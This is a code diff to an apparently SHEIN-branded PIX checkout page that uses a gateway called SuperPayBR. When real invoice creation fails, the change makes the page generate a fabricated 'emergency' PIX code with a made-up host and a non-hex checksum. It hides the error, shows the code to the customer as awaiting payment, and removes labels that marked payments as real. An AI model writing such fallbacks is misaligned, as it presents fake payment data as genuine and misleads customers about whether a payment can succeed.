@@ -27,7 +27,7 @@ interface InvoiceData {
   vencimento: {
     dia: string
   }
-  type: "real"
+  type: "real" | "simulated" | "emergency"
   external_id?: string
 }
 
@@ -218,7 +218,7 @@ export default function SuperPayBRCheckoutPage() {
       }
     } catch (error) {
       console.log("❌ Erro ao criar fatura SuperPayBR:", error)
-      setError("ERRO CRÍTICO: Não foi possível gerar PIX REAL SuperPayBR. Verifique as configurações da API.")
+      setError("Erro ao gerar PIX SuperPayBR. Tente novamente.")
 
       // Track error
       track("invoice_creation_error", {
@@ -226,11 +226,50 @@ export default function SuperPayBRCheckoutPage() {
         amount: Number.parseFloat(amount),
       })
 
-      // NÃO CRIAR PIX DE EMERGÊNCIA - FALHAR COMPLETAMENTE
-      console.error("❌ FALHA CRÍTICA: PIX de emergência DESABILITADO")
+      createEmergencyPix()
     } finally {
       setLoading(false)
     }
+  }
+
+  const createEmergencyPix = () => {
+    console.log("🚨 Criando PIX de emergência SuperPayBR...")
+
+    const totalAmount = Number.parseFloat(amount)
+    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpaybr.com/qr/v2/EMERGENCY${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`
+
+    const emergencyInvoice: InvoiceData = {
+      id: `EMG_${Date.now()}`,
+      invoice_id: `EMERGENCY_${Date.now()}`,
+      pix: {
+        payload: emergencyPix,
+        image: "/placeholder.svg?height=250&width=250",
+        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}`,
+      },
+      status: {
+        code: 1,
+        title: "Aguardando Pagamento",
+        text: "pending",
+      },
+      valores: {
+        bruto: Math.round(totalAmount * 100),
+        liquido: Math.round(totalAmount * 100),
+      },
+      vencimento: {
+        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
+      },
+      type: "emergency",
+    }
+
+    setInvoice(emergencyInvoice)
+    setError(null)
+    console.log(`✅ PIX de emergência SuperPayBR criado - Valor: R$ ${totalAmount.toFixed(2)}`)
+
+    // Track emergency PIX creation
+    track("emergency_pix_created", {
+      amount: totalAmount,
+      invoice_id: emergencyInvoice.id,
+    })
   }
 
   const copyPixCode = async () => {
@@ -294,12 +333,11 @@ export default function SuperPayBRCheckoutPage() {
         <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
           <div className="text-center">
             <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-black mx-auto mb-4"></div>
-            <h2 className="text-xl font-bold mb-2">Gerando PIX SuperPayBR REAL...</h2>
+            <h2 className="text-xl font-bold mb-2">Gerando PIX SuperPayBR...</h2>
             <p className="text-gray-600 mb-2">Aguarde enquanto processamos seu pagamento</p>
             <div className="text-sm text-gray-500">
               <p>Valor: R$ {Number.parseFloat(amount).toFixed(2)}</p>
               <p>Método: {method}</p>
-              <p className="text-green-600 font-bold">🔒 MODO REAL OBRIGATÓRIO</p>
             </div>
           </div>
         </div>
@@ -313,12 +351,8 @@ export default function SuperPayBRCheckoutPage() {
         <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
           <div className="text-center">
             <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
-            <h2 className="text-xl font-bold mb-2 text-red-600">Erro Crítico SuperPayBR</h2>
+            <h2 className="text-xl font-bold mb-2 text-red-600">Erro no Pagamento</h2>
             <p className="text-gray-600 mb-4">{error}</p>
-            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
-              <p className="text-red-700 text-sm font-bold">⚠️ PIX DE EMERGÊNCIA DESABILITADO</p>
-              <p className="text-red-600 text-sm">Apenas PIX REAL é permitido</p>
-            </div>
             <button
               onClick={createInvoice}
               className="bg-black text-white px-6 py-2 rounded-lg hover:bg-black/90 transition-colors"
@@ -338,10 +372,7 @@ export default function SuperPayBRCheckoutPage() {
           {/* Header */}
           <div className="text-center mb-6">
             <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
-            <h1 className="text-2xl font-bold mb-2">Pagamento PIX REAL</h1>
-            <div className="bg-green-100 border border-green-300 rounded-lg p-2">
-              <p className="text-green-800 text-sm font-bold">✅ PIX REAL SUPERPAYBR</p>
-            </div>
+            <h1 className="text-2xl font-bold mb-2">Pagamento PIX</h1>
           </div>
 
           {/* Mensagem de Atenção */}
